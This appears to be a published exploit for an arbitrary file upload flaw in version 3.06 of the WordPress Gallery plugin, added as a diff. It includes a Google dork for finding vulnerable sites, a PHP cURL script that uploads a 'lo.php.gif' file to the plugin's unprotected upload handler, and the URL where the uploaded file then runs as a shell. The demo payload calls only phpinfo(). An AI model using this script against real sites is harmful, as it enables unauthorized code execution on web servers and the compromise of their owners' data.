@@ -1,0 +1,39 @@
+##################################################
+# Description : Wordpress Plugins - Gallery Arbitrary File Upload 
+Vulnerability
+# Version : 3.06
+# Link : http://wordpress.org/extend/plugins/gallery-plugin/
+# Plugins : http://downloads.wordpress.org/plugin/gallery-plugin.3.06.zip
+# Date : 01-06-2012
+# Google Dork : inurl:/wp-content/plugins/gallery-plugin/
+# Author : Sammy FORGIT - sam at opensyscom dot fr - 
+http://www.opensyscom.fr
+##################################################
+
+
+Exploit :
+
+PostShell.php
+<?php
+
+$uploadfile="lo.php.gif";
+$ch = 
+curl_init("http://www.exemple.com/wordpress/wp-content/plugins/gallery-plugin/upload/php.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+         array('qqfile'=>"@$uploadfile"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+
+?>
+
+Shell Access :
+http://www.exemple.com/wordpress/wp-content/plugins/gallery-plugin/upload/files/lo.php.gif
+
+
+lo.php.gif
+<?php
+phpinfo();
+?>
